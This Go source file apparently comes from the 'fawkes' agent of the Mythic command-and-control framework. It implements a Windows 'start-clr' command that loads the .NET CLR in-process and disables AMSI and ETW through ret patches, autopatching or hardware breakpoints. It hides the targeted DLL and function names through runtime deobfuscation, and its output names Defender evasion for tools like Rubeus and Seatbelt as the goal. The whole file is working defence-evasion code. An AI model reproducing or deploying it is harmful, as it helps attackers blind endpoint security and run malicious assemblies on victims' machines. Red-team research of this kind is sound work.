//go:build windows
// +build windows

package commands

import (
	"fmt"
	"runtime"
	"strings"
	"syscall"
	"time"

	"fawkes/pkg/obfuscate"
	"fawkes/pkg/structs"

	"github.com/Ne0nd0g/go-clr"
)

// StartCLRCommand implements the start-clr command
type StartCLRCommand struct{}

// Name returns the command name
func (c *StartCLRCommand) Name() string {
	return "start-clr"
}

// Description returns the command description
func (c *StartCLRCommand) Description() string {
	return "Initialize the .NET CLR runtime with optional AMSI/ETW patching"
}

// StartCLRParams represents the JSON parameters from the Mythic modal
type StartCLRParams struct {
	AmsiPatch string `json:"amsi_patch"`
	EtwPatch  string `json:"etw_patch"`
	Action    string `json:"action"`
	Assembly  string `json:"assembly"`  // base64-encoded .NET assembly for execute-assembly
	Arguments string `json:"arguments"` // arguments for the assembly
}

// Execute executes the start-clr command
func (c *StartCLRCommand) Execute(task structs.Task) structs.CommandResult {
	// Parse params early to check for execute-assembly action
	params, parseErr := unmarshalParams[StartCLRParams](task)
	if parseErr != nil {
		return *parseErr
	}

	// Handle execute-assembly action (separate flow with auto-patching)
	if params.Action == "execute-assembly" {
		return executeAssemblyAction(params.Assembly, params.Arguments)
	}

	// Use the shared assemblyMutex from inlineassembly.go for CLR state
	assemblyMutex.Lock()
	defer assemblyMutex.Unlock()

	// Ensure we're on Windows
	if runtime.GOOS != "windows" {
		return errorResult("Error: This command is only supported on Windows")
	}

	// Default patch values for backward compat
	if params.AmsiPatch == "" {
		params.AmsiPatch = "None"
	}
	if params.EtwPatch == "" {
		params.EtwPatch = "None"
	}

	var output string

	initOutput, initErr := clrInitRuntime()
	output += initOutput
	if initErr != nil {
		return errorResult(output + fmt.Sprintf("Error initializing CLR: %v", initErr))
	}

	// Decrypt sensitive DLL/function names at runtime
	amsiDllName := obfuscate.AmsiDll()
	defer obfuscate.Zero(amsiDllName)
	amsiFunc := obfuscate.AmsiScanBuffer()
	defer obfuscate.Zero(amsiFunc)
	ntdllName := obfuscate.NtdllDll()
	defer obfuscate.Zero(ntdllName)
	etwWriteName := obfuscate.EtwEventWrite()
	defer obfuscate.Zero(etwWriteName)
	etwRegName := obfuscate.EtwEventRegister()
	defer obfuscate.Zero(etwRegName)

	// Apply AMSI patch
	switch params.AmsiPatch {
	case "Autopatch":
		output += "\n[*] Applying AMSI Autopatch...\n"
		patchOutput, err := PerformAutoPatch(amsiDllName, amsiFunc, 300)
		if err != nil {
			output += fmt.Sprintf("[-] AMSI Autopatch failed: %v\n", err)
		} else {
			amsiPatched = true
			output += patchOutput + "\n"
		}
	case "Ret Patch":
		output += "\n[*] Applying AMSI Ret Patch...\n"
		patchOutput, err := PerformRetPatch(amsiDllName, amsiFunc)
		if err != nil {
			output += fmt.Sprintf("[-] AMSI Ret Patch failed: %v\n", err)
		} else {
			amsiPatched = true
			output += patchOutput
		}
	}

	// Apply ETW patch (EtwEventWrite + EtwEventRegister)
	switch params.EtwPatch {
	case "Autopatch":
		output += "\n[*] Applying ETW Autopatch...\n"
		patchOutput, err := PerformAutoPatch(ntdllName, etwWriteName, 300)
		if err != nil {
			output += fmt.Sprintf("[-] ETW Autopatch failed: %v\n", err)
		} else {
			etwPatched = true
			output += patchOutput + "\n"
		}
		output += "[*] Applying ETW Autopatch (EtwEventRegister)...\n"
		patchOutput, err = PerformAutoPatch(ntdllName, etwRegName, 300)
		if err != nil {
			output += fmt.Sprintf("[-] EtwEventRegister Autopatch failed: %v\n", err)
		} else {
			output += patchOutput + "\n"
		}
	case "Ret Patch":
		output += "\n[*] Applying ETW Ret Patch...\n"
		patchOutput, err := PerformRetPatch(ntdllName, etwWriteName)
		if err != nil {
			output += fmt.Sprintf("[-] ETW Ret Patch failed: %v\n", err)
		} else {
			etwPatched = true
			output += patchOutput
		}
		output += "[*] Applying ETW Ret Patch (EtwEventRegister)...\n"
		patchOutput, err = PerformRetPatch(ntdllName, etwRegName)
		if err != nil {
			output += fmt.Sprintf("[-] EtwEventRegister Ret Patch failed: %v\n", err)
		} else {
			output += patchOutput
		}
	}

	needHWBP := params.AmsiPatch == "Hardware Breakpoint" || params.EtwPatch == "Hardware Breakpoint"
	if needHWBP {
		output += clrApplyHWBP(params, amsiDllName, amsiFunc, ntdllName, etwWriteName, etwRegName)
	}

	// Summary
	if params.AmsiPatch == "None" && params.EtwPatch == "None" {
		output += "\n[!] WARNING: No AMSI patch applied. Windows Defender will scan assemblies during loading."
		output += "\n[!] Known offensive tools (Seatbelt, Rubeus, SharpUp, etc.) WILL be blocked."
		output += "\n[!] Re-run start-clr with Ret Patch, Autopatch, or Hardware Breakpoint to bypass AMSI."
	} else {
		output += "\n[+] CLR initialized and patches applied. Ready for assembly execution."
	}

	return successResult(output)
}

func clrInitRuntime() (string, error) {
	var output string
	if clrStarted {
		return "[*] CLR already initialized in this process\n", nil
	}

	err := clr.RedirectStdoutStderr()
	if err != nil {
		output += fmt.Sprintf("[-] Warning: Could not redirect output: %v\n", err)
	}

	var host *clr.ICORRuntimeHost
	var loadErr error
	for attempt := 1; attempt <= 3; attempt++ {
		host, loadErr = clr.LoadCLR("v4")
		if loadErr == nil {
			break
		}
		if strings.Contains(loadErr.Error(), "cannot find the file") {
			output += fmt.Sprintf("[*] CLR load attempt %d: transient error, retrying...\n", attempt)
			jitterSleep(300*time.Millisecond, 700*time.Millisecond)
			continue
		}
		break
	}
	if loadErr != nil {
		return output, loadErr
	}
	runtimeHost = host
	clrStarted = true
	output += "[+] CLR v4 runtime initialized successfully\n"

	err = loadAMSI()
	if err != nil {
		output += fmt.Sprintf("[-] Warning: Failed to load target DLL: %v\n", err)
	} else {
		output += "[+] Target DLL loaded successfully\n"
	}
	return output, nil
}

func clrApplyHWBP(params *StartCLRParams, amsiDllName, amsiFunc, ntdllName, etwWriteName, etwRegName string) string {
	var output string
	output += "\n[*] Setting up Hardware Breakpoint patches...\n"

	var amsiAddr uintptr
	if params.AmsiPatch == "Hardware Breakpoint" {
		addr, err := resolveFunctionAddress(amsiDllName, amsiFunc)
		if err != nil {
			output += fmt.Sprintf("[-] Failed to resolve target: %v\n", err)
		} else {
			amsiAddr = addr
			output += fmt.Sprintf("[+] Target at 0x%X -> Dr0\n", addr)
		}
	}

	if params.EtwPatch == "Hardware Breakpoint" {
		output += "[*] ETW: Using fallback patch (HWBP unsafe with Go runtime threads)\n"
		patchOutput, err := PerformRetPatch(ntdllName, etwWriteName)
		if err != nil {
			output += fmt.Sprintf("[-] ETW patch failed: %v\n", err)
		} else {
			etwPatched = true
			output += patchOutput
		}
		patchOutput, err = PerformRetPatch(ntdllName, etwRegName)
		if err != nil {
			output += fmt.Sprintf("[-] ETW register patch failed: %v\n", err)
		} else {
			output += patchOutput
		}
	}

	if amsiAddr != 0 {
		hwbpOutput, err := SetupHardwareBreakpoints(amsiAddr, 0)
		if err != nil {
			output += fmt.Sprintf("[-] Hardware Breakpoint setup failed: %v\n", err)
		} else {
			amsiPatched = true
			output += hwbpOutput
		}
	}
	return output
}

// loadAMSI explicitly loads the AMSI DLL into the process
func loadAMSI() error {
	name := obfuscate.AmsiDll()
	defer obfuscate.Zero(name)
	dll, err := syscall.LoadDLL(name)
	if err != nil {
		return fmt.Errorf("failed to load target DLL: %w", err)
	}
	// We keep the handle - don't release it since we want it loaded in memory
	_ = dll

	return nil
}
